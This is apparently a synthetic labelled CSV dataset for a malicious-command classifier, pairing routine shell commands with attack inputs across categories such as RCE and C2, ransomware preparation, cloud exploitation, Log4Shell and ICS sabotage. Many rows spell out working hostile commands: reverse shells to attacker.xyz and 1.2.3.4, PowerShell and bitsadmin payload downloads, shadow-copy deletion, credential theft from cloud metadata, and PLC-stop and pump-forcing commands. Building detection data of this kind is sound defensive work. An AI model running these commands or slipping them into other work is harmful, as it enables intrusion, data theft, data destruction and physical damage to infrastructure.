timestamp,src_ip,input,label
2026-01-20T17:46:38.706916,56.111.177.1,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.741361,111.84.86.220,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.691257,72.153.117.10,npm start,Normal_Business_Ops
2026-01-20T17:46:38.684749,176.157.143.33,uptime,Normal_Business_Ops
2026-01-20T17:46:38.732168,61.78.108.43,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.740386,96.60.132.122,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.751920,141.158.1.239,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.716597,149.0.31.196,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.705366,125.42.182.64,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.695355,193.59.12.135,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.730167,219.156.165.110,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.706362,177.176.207.42,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.696355,198.160.67.50,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.709422,130.62.65.36,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.693354,18.44.28.19,npm start,Normal_Business_Ops
2026-01-20T17:46:38.753424,179.96.191.156,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.688752,56.103.199.76,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.751920,21.139.66.195,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.744361,222.167.122.245,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.736168,100.162.178.31,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.746362,57.159.207.146,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.699355,187.255.229.159,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.687752,209.37.214.31,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.695355,145.113.101.78,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.737706,184.35.160.206,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.699355,23.30.249.61,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.739701,163.15.24.251,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.738701,14.247.24.135,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.754419,122.199.218.224,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.695355,70.49.198.131,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.735167,172.188.104.214,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.743361,88.96.29.108,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.707462,172.29.80.29,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.743361,192.105.115.231,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.700357,34.65.183.235,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.748407,157.113.3.101,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.722168,125.81.158.70,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.703359,34.192.64.138,git add .,Normal_Business_Ops
2026-01-20T17:46:38.702379,131.158.111.172,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.730167,32.76.146.19,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.738701,127.73.6.168,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.710422,16.146.86.23,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.701356,23.88.80.194,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.749363,178.62.168.9,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.731167,96.244.89.169,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.708422,202.79.117.131,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.710422,131.166.110.46,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.727166,138.207.49.84,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.747362,14.39.220.136,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.711422,130.200.152.187,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.686752,150.16.20.145,git branch,Normal_Business_Ops
2026-01-20T17:46:38.738701,209.188.85.180,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.741361,74.251.219.87,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.724165,103.166.156.108,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.741361,37.84.48.67,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.747362,94.39.140.103,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.754419,114.198.170.133,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.687752,67.122.103.203,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.753424,137.131.130.190,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.693354,65.2.179.245,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.729167,197.147.49.144,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.729167,57.22.166.233,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.737706,5.107.205.199,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.752911,59.106.14.105,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.687752,101.228.84.116,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.732168,47.171.46.6,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.714423,8.154.232.71,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.693354,126.229.53.108,git pull,Normal_Business_Ops
2026-01-20T17:46:38.728166,22.90.75.199,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.748407,53.55.130.120,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.704359,25.41.6.184,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.725166,92.80.189.239,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.695355,113.227.238.91,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.733168,50.255.103.157,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.706408,42.40.92.25,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.686752,197.185.249.61,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.712423,192.47.198.119,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.696355,95.227.209.129,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.693354,19.29.173.77,whoami,Normal_Business_Ops
2026-01-20T17:46:38.702379,220.14.241.77,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.706916,71.60.243.39,whoami,Normal_Business_Ops
2026-01-20T17:46:38.701356,202.105.0.44,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.726165,192.104.248.22,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.690278,138.62.53.25,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.697356,47.216.251.214,whoami,Normal_Business_Ops
2026-01-20T17:46:38.750363,148.133.113.125,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.728166,93.154.147.72,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.703359,5.110.226.169,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.689753,36.109.47.35,npm start,Normal_Business_Ops
2026-01-20T17:46:38.741361,77.33.33.250,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.726165,193.33.57.20,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.744361,142.60.3.24,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.743361,108.161.24.45,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.726165,68.42.187.252,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.712423,222.121.249.15,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.718598,31.17.165.24,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.692357,34.39.223.176,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.709422,110.196.169.247,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.686752,177.30.34.150,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.714423,24.41.89.151,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.717597,138.100.189.82,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.730167,173.193.74.3,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.690278,32.240.7.31,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.742361,107.159.120.24,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.703359,127.70.55.111,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.755771,37.183.218.41,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.719650,108.103.220.35,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.698355,129.252.37.231,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.753424,105.207.234.7,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.730167,4.98.223.250,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.722168,11.44.142.241,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.723165,178.6.213.49,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.720628,170.235.84.47,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.684749,33.86.28.182,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.734167,187.44.168.104,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.683749,143.26.203.196,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.755771,191.176.48.73,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.708422,76.204.119.10,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.705366,38.143.121.104,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.755771,99.83.146.156,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.693354,150.128.65.28,git branch,Normal_Business_Ops
2026-01-20T17:46:38.710422,131.183.44.129,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.721658,59.196.255.167,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.713423,35.188.239.60,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.746362,223.205.64.213,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.688752,45.53.155.194,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.738701,212.11.15.145,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.685785,187.181.138.2,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.690278,156.185.209.8,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.702379,154.13.34.251,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.685785,187.115.223.215,df -h,Normal_Business_Ops
2026-01-20T17:46:38.685785,157.159.173.222,whoami,Normal_Business_Ops
2026-01-20T17:46:38.719650,169.208.55.153,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.740386,219.151.223.206,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.698355,168.227.135.84,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.735167,2.184.207.41,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.715600,132.28.7.155,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.708422,108.54.54.189,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.731167,95.115.29.78,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.694354,188.170.234.82,git pull,Normal_Business_Ops
2026-01-20T17:46:38.727166,128.122.231.138,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.724165,24.34.124.196,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
